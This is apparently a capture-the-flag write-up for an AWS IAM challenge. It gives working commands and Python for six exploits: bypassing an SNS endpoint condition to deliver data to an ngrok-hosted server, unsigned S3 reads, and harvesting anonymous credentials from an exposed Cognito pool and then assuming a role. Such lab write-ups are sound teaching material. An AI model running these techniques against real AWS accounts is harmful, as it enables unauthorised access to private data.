# AWS IAM Challenge

## challenge 1

All you need to is to use **awscli** to navigate a S3 Bucket:

`aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt -`

## challenge 2

In order to pass this one you just need to pull messages from the queue:
```bash
aws sqs receive-message \
        --queue-url https://sqs.us-east-1.amazonaws.com/XXXXX/XXXXX
```

## challenge 3

This policy is given, we just need to subscribe to the SNS topic and bypass the condition which is `*@tbic.wiz.io`.
```json
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:123123123123:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```
Then we create a simple web server with that bypassing http endpoint and then print any response with a `print()`, flag appears there:
```python
from flask import Flask, request
import json
import requests

app = Flask(__name__)

@app.route('/blah@tbic.wiz.io', methods=['POST'])
def handle_notification():
    message = json.loads(request.data)
    print(message)
    return 'OK', 200

if __name__ == '__main__':
    app.run(port=5000)
```
Once we have running our custom web server, we expose it to internet with `ngrok`, we get the public endpoint and finally subscribe to the SNS:
```bash
aws sns subscribe \
        --topic-arn arn:aws:sns:us-east-1:123123123123:TBICWizPushNotifications \
        --protocol https \
        --notification-endpoint 'https://104c-2800-cd0-c42-2700-e1df-d5ec.sa.ngrok.io/blah@tbic.wiz.io'
```

Then we have to pay attention to our Flask console logs, flag is sent there from AWS.

## challenge 4

Now this Policy is given. Notice that any `Principal` is allowed to make requests.
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                },
                "ForAllValues:StringLike": {
                    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"
                }
            }
        }
    ]
}
```
So we just skip authentication with `--no-sign-request`:
```bash
aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/
aws s3 cp --no-sign-request s3://thebigiamchallenge-admin-storage-abf1321/files/flag2.txt -
```

## challenge 5
On this one, you will realize that the website is using Cognito as Identity Provider, the trick here is that the pool id is being exposed (in the same web page) and people can anonymously get AWS Credentials.
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "VisualEditor0",
            "Effect": "Allow",
            "Action": [
                "mobileanalytics:PutEvents",
                "cognito-sync:*"
            ],
            "Resource": "*"
        },
        {
            "Sid": "VisualEditor1",
            "Effect": "Allow",
            "Action": [
                "s3:GetObject",
                "s3:ListBucket"
            ],
            "Resource": [
                "arn:aws:s3:::wiz-privatefiles",
                "arn:aws:s3:::wiz-privatefiles/*"
            ]
        }
    ]
}
```

So we just need to grab the pool id and request AWS Credentials:
```python
import boto3

identity_pool_id = 'us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b'
identity_client = boto3.client('cognito-identity', 'us-east-1')

identity_response = identity_client.get_id(IdentityPoolId=identity_pool_id)
creds = identity_client.get_credentials_for_identity(IdentityId=identity_response['IdentityId'])

print(f"export AWS_ACCESS_KEY_ID={creds['Credentials']['AccessKeyId']}")
print(f"export AWS_SECRET_ACCESS_KEY={creds['Credentials']['SecretKey']}")
print(f"export AWS_SESSION_TOKEN={creds['Credentials']['SessionToken']}")
```
Now we can grab the flag:
`aws s3 cp s3://wiz-privatefiles/flag1.txt -`


## challenge 6

This one is similar to the previous, the only thing here is that we have to Assume a Role with Web Identity.
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "cognito-identity.amazonaws.com"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "cognito-identity.amazonaws.com:aud": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
                }
            }
        }
    ]
}
```
```python
import boto3

identity_pool_id = 'us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b'
identity_client = boto3.client('cognito-identity', 'us-east-1')

role_to_assume_arn = 'arn:aws:iam::123123123123:role/Cognito_s3accessAuth_Role'

identity_response = identity_client.get_id(IdentityPoolId=identity_pool_id)
identity_id = identity_response['IdentityId']
creds = identity_client.get_credentials_for_identity(IdentityId=identity_response['IdentityId'])

cognito_client = boto3.client('cognito-identity', 'us-east-1')
open_id_token_response = cognito_client.get_open_id_token(IdentityId=identity_id)
open_id_token = open_id_token_response['Token']

sts_client = boto3.client('sts')
creds = sts_client.assume_role_with_web_identity(
    RoleArn=role_to_assume_arn,
    RoleSessionName='AssumeRoleSession',
    WebIdentityToken=open_id_token,
)

print(f"export AWS_ACCESS_KEY_ID={creds['Credentials']['AccessKeyId']}")
print(f"export AWS_SECRET_ACCESS_KEY={creds['Credentials']['SecretAccessKey']}")
print(f"export AWS_SESSION_TOKEN={creds['Credentials']['SessionToken']}")
```
And now we can grab the flag:
`aws s3 cp s3://wiz-privatefiles-x1000/flag2.txt -`
